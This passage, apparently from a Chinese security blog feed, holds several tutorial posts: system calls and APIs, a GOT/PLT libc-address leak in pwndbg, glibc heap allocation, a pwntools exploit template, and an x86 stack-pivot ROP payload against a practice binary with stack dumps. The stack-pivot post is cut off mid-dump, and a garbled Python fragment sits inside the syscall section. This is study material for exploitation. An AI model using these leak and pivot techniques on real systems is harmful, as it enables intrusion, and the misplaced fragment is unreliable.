title="API&#x2F;POSIX&#x2F;C库的区别与联系"></a>API&#x2F;POSIX&#x2F;C库的区别与联系</h2><p>一般情况下，应用程序通过应用编程接口(API)而不是直接通过系统调用来编程。这点很重要，因为应用程序使用的这种编程接口实际上并不需要和内核提供的系统调用一一对应。</p><blockquote><p>一个API定义了一组应用程序使用的编程接口。它们可以实现成一个系统调用，也可以通过调用多个系统调用来实现，而完全不使用任何系统调用也不存在问题。实际上，API可以在各种不同的操作系统上实现，给应用程序提供完全相同的接口，而它们本身在这些系统上的实现却可能迥异。</p></blockquote><p>在Unix世界中，最流行的应用编程接口是基于POSIX标准的，其目标是提供一套大体上基于Unix的可移植操作系统标准。POSIX是说明API和系统调用之间关系的一个极好例子。在大多数Unix系统上，根据POSIX而定义的API函数和系统调用之间有着直接关系。</p><p>Linux的系统调用像大多数Unix系统一样，作为C库的一部分提供如下图所示。C库实现了 Unix系统的主要API，包括标准C库函数和系统调用。所有的C程序都可以使用C库，而由于C语言本身的特点，其他语言也可以很方便地把它们封装起来使用。</p><p>从程序员的角度看，系统调用无关紧要，他们只需要跟API打交道就可以了。相反，内核只跟系统调用打交道；库函数及应用程序是怎么使用系统调用不是内核所关心的。</p><p>关于Unix的界面设计有一句通用的格言“提供机制而不是策略”。换句话说，Unix的系统调用抽象出了用于完成某种确定目的的函数。至干这些函数怎么用完全不需要内核去关心。区别对待机制(mechanism)和策略(policy)是Unix设计中的一大亮点。大部分的编程问题都可以被切割成两个部分:“需要提供什么功能”(机制)和“怎样实现这些功能”(策略)。</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>api是函数的定义，规定了这个函数的功能，跟内核无直接关系。而系统调用是通过中断向内核发请求，实现内核提供的某些服务。</p><h2 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h2><p>一个api可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。<br>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。<br>因此，API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。<br>系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。<br>并不是所有的API函数都一一对应一个系统调用，有时，一个API函数会需要几个系统调用来共同完成函数的功能，甚至还有一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）系统调用概述</p><p>计算机系统的各种硬件资源是有限的，在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，为了更好的管理这些资源进程是不允许直接操作的，所有对这些资源的访问都必须有操作系统控制。也就是说操作系统是使用这些资源的唯一入口，而这个入口就是操作系统提供的<strong>系统调用（System Call）</strong>。在linux中系统调用是用户空间访问内核的唯一手段，除异常和陷入外，他们是内核唯一的合法入口。</p><p>一般情况下应用程序通过应用编程接口API，而不是直接通过系统调用来编程。在Unix世界，最流行的API是基于POSIX标准的。</p><p>操作系统一般是通过中断从用户态切换到内核态。中断就是一个硬件或软件请求，要求CPU暂停当前的工作，去处理更重要的事情。比如，在x86机器上可以通过int指令进行软件中断，而在磁盘完成读写操作后会向CPU发起硬件中断。</p><p>中断有两个重要的属性，中断号和中断处理程序。中断号用来标识不同的中断，不同的中断具有不同的中断处理程序。在操作系统内核中维护着一个中断向量表（Interrupt Vector Table），这个数组存储了所有中断处理程序的地址，而中断号就是相应中断在中断向量表中的偏移量。</p><p>一般地，系统调用都是通过软件中断实现的，x86系统上的软件中断由int $0x80指令产生，而128号异常处理程序就是系统调用处理程序system_call()，它与硬件体系有关，在entry.S中用汇编写。接下来就来看一下Linux下系统调用具体的实现过程。</p><h2 id="为什么需要系统调用-1"><a href="#为什么需要系统调用-1" class="headerlink" title="为什么需要系统调用"></a>为什么需要系统调用</h2><p>xxxxxxxxxx line &#x3D; p.recvline().decode().strip()#.decode()：将接收到的字节串转换为Python字符串。#.strip()：去除字符串开头和结尾的空格和换行符。match &#x3D; re.search(r’0x[0-9a-fA-F]+’, line)value &#x3D; match.group(0)#返回第一个匹配到的字符串python</p><p>一般的，进程是不能访问内核的。它不能访问内核所占内存空间也不能调用内核函数。CPU硬件决定了这些（这就是为什么它被称作<strong>“保护模式”</strong>）。</p><p>为了和用户空间上运行的进程进行交互，内核提供了一组接口。透过该接口，应用程序可以访问硬件设备和其他操作系统资源。这组接口在应用程序和内核之间扮演了使者的角色，应用程序发送各种请求，而内核负责满足这些请求(或者让应用程序暂时搁置)。实际上提供这组接口主要是为了保证系统稳定可靠，避免应用程序肆意妄行，惹出大麻烦。</p><p>系统调用在用户空间进程和硬件设备之间添加了一个中间层。该层主要作用有三个：</p><p>1、它为用户空间提供了一种统一的硬件的抽象接口。比如当需要读些文件的时候，应用程序就可以不去管磁盘类型和介质，甚至不用去管文件所在的文件系统到底是哪种类型。</p><p>2、系统调用保证了系统的稳定和安全。作为硬件设备和应用程序之间的中间人，内核可以基于权限和其他一些规则对需要进行的访问进行裁决。举例来说，这样可以避免应用程序不正确地使用硬件设备，窃取其他进程的资源，或做出其他什么危害系统的事情。</p><p>3、每个进程都运行在虚拟系统中，而在用户空间和系统的其余部分提供这样一层公共接口，也是出于这种考虑。如果应用程序可以随意访问硬件而内核又对此一无所知的话，几乎就没法实现多任务和虚拟内存，当然也不可能实现良好的稳定性和安全性。在Linux中，系统调用是用户空间访问内核的惟一手段；除异常和中断外，它们是内核惟一的合法入口。</p><h2 id="API-POSIX-C库的区别与联系-1"><a href="#API-POSIX-C库的区别与联系-1" class="headerlink" title="API&#x2F;POSIX&#x2F;C库的区别与联系"></a>API&#x2F;POSIX&#x2F;C库的区别与联系</h2><p>一般情况下，应用程序通过应用编程接口(API)而不是直接通过系统调用来编程。这点很重要，因为应用程序使用的这种编程接口实际上并不需要和内核提供的系统调用一一对应。</p><blockquote><p>一个API定义了一组应用程序使用的编程接口。它们可以实现成一个系统调用，也可以通过调用多个系统调用来实现，而完全不使用任何系统调用也不存在问题。实际上，API可以在各种不同的操作系统上实现，给应用程序提供完全相同的接口，而它们本身在这些系统上的实现却可能迥异。</p></blockquote><p>在Unix世界中，最流行的应用编程接口是基于POSIX标准的，其目标是提供一套大体上基于Unix的可移植操作系统标准。POSIX是说明API和系统调用之间关系的一个极好例子。在大多数Unix系统上，根据POSIX而定义的API函数和系统调用之间有着直接关系。</p><p>Linux的系统调用像大多数Unix系统一样，作为C库的一部分提供如下图所示。C库实现了 Unix系统的主要API，包括标准C库函数和系统调用。所有的C程序都可以使用C库，而由于C语言本身的特点，其他语言也可以很方便地把它们封装起来使用。</p><p>从程序员的角度看，系统调用无关紧要，他们只需要跟API打交道就可以了。相反，内核只跟系统调用打交道；库函数及应用程序是怎么使用系统调用不是内核所关心的。</p><p>关于Unix的界面设计有一句通用的格言“提供机制而不是策略”。换句话说，Unix的系统调用抽象出了用于完成某种确定目的的函数。至干这些函数怎么用完全不需要内核去关心。区别对待机制(mechanism)和策略(policy)是Unix设计中的一大亮点。大部分的编程问题都可以被切割成两个部分:“需要提供什么功能”(机制)和“怎样实现这些功能”(策略)。</p><h2 id="区别-1"><a href="#区别-1" class="headerlink" title="区别"></a>区别</h2><p>api是函数的定义，规定了这个函数的功能，跟内核无直接关系。而系统调用是通过中断向内核发请求，实现内核提供的某些服务。</p><h2 id="联系-1"><a href="#联系-1" class="headerlink" title="联系"></a>联系</h2><p>一个api可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。<br>程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。<br>因此，API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。<br>系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。<br>并不是所有的API函数都一一对应一个系统调用，有时，一个API函数会需要几个系统调用来共同完成函数的功能，甚至还有一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/got%E4%B8%8Eplt/"/>
    <url>/2024/09/16/got%E4%B8%8Eplt/</url>
    
    <content type="html"><![CDATA[<h2 id="Linux动态链接中的got-plt表、plt表"><a href="#Linux动态链接中的got-plt表、plt表" class="headerlink" title="Linux动态链接中的got.plt表、plt表"></a>Linux动态链接中的got.plt表、plt表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;aaaaaaaaa&quot;</span>);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bbbbbbbbb&quot;</span>);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用这一段代码进行实验，得到函数的真实地址一般采用got表进行泄露，只要执行puts函数之后，got表里面放的就是puts函数的真实地址，sleep是为了下断点</p><p>真实地址是指在当前libc条件下，真实地址&#x3D;libc.base(libc的基地址)+libc.symbol[函数名称] (函数在libc中的偏移)</p><p>gcc -g -z execstack -fno-stack-protector test.c -o test编译生成文件，关闭栈保护</p><p>在sleep处下断点，运行，finish到第一个puts函数前面，si进入puts函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">[ DISASM / x86-64 / set emulate on ]<br> ► 0x400430       &lt;puts@plt&gt;                         jmp    qword ptr [rip + 0x200be2]    &lt;puts@got[plt]&gt;<br><br>   0x400436       &lt;puts@plt+6&gt;                       push   0<br>   0x40043b       &lt;puts@plt+11&gt;                      jmp    0x400420                      &lt;0x400420&gt;<br>    ↓<br>   0x400420                                          push   qword ptr [rip + 0x200be2]    &lt;_GLOBAL_OFFSET_TABLE_+8&gt;<br>   0x400426                                          jmp    qword ptr [rip + 0x200be4]    &lt;_dl_runtime_resolve_xsavec&gt;<br>    ↓<br>   0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;       endbr64 <br>   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;     push   rbx<br>   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;     mov    rbx, rsp<br>   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;     and    rsp, 0xffffffffffffffc0<br>   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;    sub    rsp, qword ptr [rip + 0x23f4d] &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;    mov    qword ptr [rsp], rax<br></code></pre></td></tr></table></figure><p>此时在ida里面看一下puts函数got表地址，程序下一步要跳转到rip+0x200be2的地址执行后续也就是0x601018的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/4gx 0x601018<br>0x601018 &lt;puts@got.plt&gt;:0x00000000004004360x00007ffff7c29dc0<br>0x601028 &lt;sleep@got.plt&gt;:0x00007ffff7cea5700x0000000000000000<br></code></pre></td></tr></table></figure><p>此时puts函数的真实地址还没有泄露，程序去执行0x400436的位置，也就是往下执行，ni走完整个puts函数finish步出函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/4gx 0x601018<br>0x601018 &lt;puts@got.plt&gt;:0x00007ffff7c80e500x00007ffff7c29dc0<br>0x601028 &lt;sleep@got.plt&gt;:0x00007ffff7cea5700x0000000000000000<br></code></pre></td></tr></table></figure><p>此时的got表如上面，可以看到got表中已经存放puts函数的真实地址单步步入下一个puts。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">► 0x400430       &lt;puts@plt&gt;    jmp    qword ptr [rip + 0x200be2]    &lt;puts&gt;<br>   ↓<br>  0x7ffff7c80e50 &lt;puts&gt;        endbr64 <br>  0x7ffff7c80e54 &lt;puts+4&gt;      push   r14<br>  0x7ffff7c80e56 &lt;puts+6&gt;      push   r13<br>  0x7ffff7c80e58 &lt;puts+8&gt;      push   r12<br>  0x7ffff7c80e5a &lt;puts+10&gt;     mov    r12, rdi<br>  0x7ffff7c80e5d &lt;puts+13&gt;     push   rbp<br>  0x7ffff7c80e5e &lt;puts+14&gt;     push   rbx<br>  0x7ffff7c80e5f &lt;puts+15&gt;     sub    rsp, 0x10<br>  0x7ffff7c80e63 &lt;puts+19&gt;     call   *ABS*+0xa86a0@plt                &lt;*ABS*+0xa86a0@plt&gt;<br><br>  0x7ffff7c80e68 &lt;puts+24&gt;     mov    r13, qword ptr [rip + 0x198fc9]<br></code></pre></td></tr></table></figure><p>可以看到下一步直接就是执行了puts函数的真实地址</p><p>所以，栈进行leak时，可以根据got表中存放的真实地址来泄露Iibc基地址：<br>libc_base&#x3D;leak_function_addr_in_stack-libc.symbols[‘function’]</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/glibc%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/09/16/glibc%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="glibc堆管理机制"><a href="#glibc堆管理机制" class="headerlink" title="glibc堆管理机制"></a>glibc堆管理机制</h2><h3 id="Memory-ALLcator"><a href="#Memory-ALLcator" class="headerlink" title="Memory ALLcator"></a>Memory ALLcator</h3><p>常见的内存管理机制：</p><p>​dlmalloc：通用分配器</p><p>​ptmalloc：glibc分配器，继承自dlmalloc，并提供了多线程支持，主要研究对象</p><p>​jemalloc：Firefox</p><p>​tcmalloc：Chrome</p><p>​其他：编程语言内存分配及回收，比如python</p><h3 id="malloc工作机制"><a href="#malloc工作机制" class="headerlink" title="malloc工作机制"></a>malloc工作机制</h3><p>第一次调用malloc</p><p>如果调用分配大小大于128kb，会去调用mmap函数，交由内核函数sys_mmap处理</p><p>如果调用分配大小小于128kb，会去调用brk()函数，交由内核函数sys_brk处理</p><h3 id="内存分配机制"><a href="#内存分配机制" class="headerlink" title="内存分配机制"></a>内存分配机制</h3><p>头文件：#include&lt;unistd.h&gt;</p><p>​brk()：</p><p>​函数原型：int brk (void*end_data_segment)</p><p>​功能和作用：用于设置program_break指向的位置</p><p>​sbrk()</p><p>​函数原型：void* sbrk(intptr_t increment)</p><p>​功能和作用：同brk()，参数可以是负数。执行成功返回上一次program_break的值，可以设置参数为0返回当</p><p>前的program_break.</p><p>​mmap()</p><p>​功能和作用：当用户申请空间大于等于128kb，也就是0x20000字节时，不再使用brk()进行分配，改为使用</p><p>mmap()。</p><p>​unmmap()</p><p>​功能和作用：堆mmap()申请的空间进行回收。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E4%B8%87%E8%83%BD%E5%BC%80%E5%A4%B4/"/>
    <url>/2024/09/16/%E4%B8%87%E8%83%BD%E5%BC%80%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="万能开头"><a href="#万能开头" class="headerlink" title="万能开头"></a>万能开头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>io = process(<span class="hljs-string">&#x27;&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slog</span>(<span class="hljs-params">name, address</span>): io.success(name + <span class="hljs-string">&quot;==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(address))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address</span>():<br>    <span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io, <span class="hljs-string">&#x27;b vuln&#x27;</span>)<br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89%E5%AE%9E%E9%AA%8C/"/>
    <url>/2024/09/16/%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="栈迁移（x86）实验"><a href="#栈迁移（x86）实验" class="headerlink" title="栈迁移（x86）实验"></a>栈迁移（x86）实验</h2><p>源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+0h] [ebp-28h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( count != <span class="hljs-number">1337</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  ++count;<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try your best :&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40u</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>栈的内容即程序EIP执行的流程（因为我们总是覆盖函数的返回地址）栈中的内容都是栈：函数  返回地址   参数</p><p>栈迁移和描述的一样就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。可以利用该技巧来解决栈空间的大小不足问题。每当进入一个函数的时候，都会执行call指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">call func() ;//push eip+4 ; push ebp ; mov ebp,esp;<br></code></pre></td></tr></table></figure><p>call指令，先将返回地址（eip+4）进行push，然后jmp func的地址，最后执行push ebp;    mov ebp esp;</p><p>call func()执行完之后要退出的时候要进行与call func()相反的操作（恢复现场）维持堆栈平衡</p><p>mov esp,ebp pop ebp,因为pop指令是把栈顶的值弹到指定寄存器，也就是说esp会自动的减一个单位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">leave;  //mov esp,ebp;  pop ebp;<br>ret ;   //pop rip;<br></code></pre></td></tr></table></figure><p>栈迁移的核心思想就是：将栈的esp和ebp转移到一个“输出不收长度限制且可控制”的地址处，通常是bss段地址，在最后ret的时候，如果我们能够控制得了栈顶的esp指向的地址就相当于控制了程序执行流。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr">#0</span>x<span class="hljs-number">0804836</span>d : pop ebx ; ret<br>payload<span class="hljs-number">1</span>=cyclic<span class="hljs-comment">(0x28)</span><span class="hljs-attr">#到达ebp</span><br><span class="hljs-attr">payload1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(buf)</span><br>payload<span class="hljs-number">1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(read_plt)</span><span class="hljs-attr">#read函数覆盖的是main函数的返回地址，所以程序会先执行main函数结尾的leave和ret指令，形成了read（0</span>,bss<span class="hljs-number">+0</span>x<span class="hljs-number">500</span>,<span class="hljs-number">0</span>x<span class="hljs-number">100</span>）的函数结构等待pop eip来执行<br><span class="hljs-attr">#eip指向read_plt执行read函数，在bss+0</span>x<span class="hljs-number">500</span>的地方读入payload<span class="hljs-number">2</span><br>payload<span class="hljs-number">1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(leave_ret)</span><span class="hljs-attr">#read函数执行之后，再进行leave_ret，eip去执行leave指令(mov esp，ebp；)</span><br><span class="hljs-attr">payload1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(0)</span><span class="hljs-attr">#argv[1</span>]<br>payload<span class="hljs-number">1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(buf)</span><span class="hljs-attr">#argv[2</span>]<br>payload<span class="hljs-number">1</span>+=p<span class="hljs-number">32</span><span class="hljs-comment">(0x100)</span><span class="hljs-attr">#argv[3</span>]<br><br></code></pre></td></tr></table></figure><p>执行之后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; stack <span class="hljs-number">30</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffd3380c —▸ <span class="hljs-number">0</span>xedb08b80 (_rtld_global_ro) ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">038</span> <span class="hljs-number">0</span>xffd33810 —▸ <span class="hljs-number">0</span>x80484ff (main+<span class="hljs-number">84</span>) ◂— add esp, <span class="hljs-number">0</span>xc<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">034</span> <span class="hljs-number">0</span>xffd33814 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">030</span> <span class="hljs-number">0</span>xffd33818 —▸ <span class="hljs-number">0</span>xffd33820 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">02</span>c <span class="hljs-number">0</span>xffd3381c ◂— <span class="hljs-number">0</span>x40 /* &#x27;@&#x27; */<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│ ecx <span class="hljs-number">0</span>xffd33820 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">024</span> <span class="hljs-number">0</span>xffd33824 ◂— <span class="hljs-number">0</span>x61616162 (&#x27;baaa&#x27;)<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">020</span> <span class="hljs-number">0</span>xffd33828 ◂— <span class="hljs-number">0</span>x61616163 (&#x27;caaa&#x27;)<br><span class="hljs-attribute">08</span>:<span class="hljs-number">0020</span>│-<span class="hljs-number">01</span>c <span class="hljs-number">0</span>xffd3382c ◂— <span class="hljs-number">0</span>x61616164 (&#x27;daaa&#x27;)<br><span class="hljs-attribute">09</span>:<span class="hljs-number">0024</span>│-<span class="hljs-number">018</span> <span class="hljs-number">0</span>xffd33830 ◂— <span class="hljs-number">0</span>x61616165 (&#x27;eaaa&#x27;)<br><span class="hljs-attribute">0a</span>:<span class="hljs-number">0028</span>│-<span class="hljs-number">014</span> <span class="hljs-number">0</span>xffd33834 ◂— <span class="hljs-number">0</span>x61616166 (&#x27;faaa&#x27;)<br><span class="hljs-attribute">0b</span>:<span class="hljs-number">002</span>c│-<span class="hljs-number">010</span> <span class="hljs-number">0</span>xffd33838 ◂— <span class="hljs-number">0</span>x61616167 (&#x27;gaaa&#x27;)<br><span class="hljs-attribute">0c</span>:<span class="hljs-number">0030</span>│-<span class="hljs-number">00</span>c <span class="hljs-number">0</span>xffd3383c ◂— <span class="hljs-number">0</span>x61616168 (&#x27;haaa&#x27;)<br><span class="hljs-attribute">0d</span>:<span class="hljs-number">0034</span>│-<span class="hljs-number">008</span> <span class="hljs-number">0</span>xffd33840 ◂— <span class="hljs-number">0</span>x61616169 (&#x27;iaaa&#x27;)<br><span class="hljs-attribute">0e</span>:<span class="hljs-number">0038</span>│-<span class="hljs-number">004</span> <span class="hljs-number">0</span>xffd33844 ◂— <span class="hljs-number">0</span>x6161616a (&#x27;jaaa&#x27;)<br><span class="hljs-attribute">0f</span>:<span class="hljs-number">003</span>c│ ebp <span class="hljs-number">0</span>xffd33848 —▸ <span class="hljs-number">0</span>x804a50c ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">10</span>:<span class="hljs-number">0040</span>│+<span class="hljs-number">004</span> <span class="hljs-number">0</span>xffd3384c —▸ <span class="hljs-number">0</span>x8048380 (read@plt) ◂— jmp dword ptr<span class="hljs-meta"> [0x8049fe8]</span><br><span class="hljs-attribute">11</span>:<span class="hljs-number">0044</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0</span>xffd33850 —▸ <span class="hljs-number">0</span>x8048504 (main+<span class="hljs-number">89</span>) ◂— leave <br><span class="hljs-attribute">12</span>:<span class="hljs-number">0048</span>│+<span class="hljs-number">00</span>c <span class="hljs-number">0</span>xffd33854 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">13</span>:<span class="hljs-number">004</span>c│+<span class="hljs-number">010</span> <span class="hljs-number">0</span>xffd33858 —▸ <span class="hljs-number">0</span>x804a50c ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">14</span>:<span class="hljs-number">0050</span>│+<span class="hljs-number">014</span> <span class="hljs-number">0</span>xffd3385c ◂— <span class="hljs-number">0</span>x100<br><span class="hljs-attribute">15</span>:<span class="hljs-number">0054</span>│+<span class="hljs-number">018</span> <span 